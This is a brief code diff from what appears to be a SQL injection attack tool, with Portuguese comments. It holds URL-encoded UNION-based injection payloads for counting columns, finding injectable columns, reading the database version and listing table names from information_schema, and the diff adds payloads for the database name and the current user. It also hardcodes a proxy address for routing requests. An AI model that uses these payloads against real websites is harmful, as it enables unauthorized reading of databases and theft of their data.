@@ -34,7 +34,9 @@ PROXIES_ = {'http': 'http://217.219.61.6:8080', 'https': 'https://217.219.61.6:8
 FIND_NUMBER_OF_COLLUM_IN_TABLE = '+ORDER+BY+' # aqui vai acrescentando a quanntidade de ordenação e validar
 VULNERABLE_COLLUM_DETECTING = "+UNION+SELECT+" 
 CHECKING_FOR_DBMS_VERSION = "version()";
+DATABASE_NAME = "database()";
 GET_TABLES_NAMES = "(SELECT+group_concat(table_name)+from+information_schema.tables+where+table_schema=database())" 
+GET_CURRENT_USER = "(SELECT+CURRENT_USER)"
 
 
 OS = ['ubuntu', 'kali', 'windows', 'macos', 'oracle solaris', 'fedora','susi', 'red hat' ]
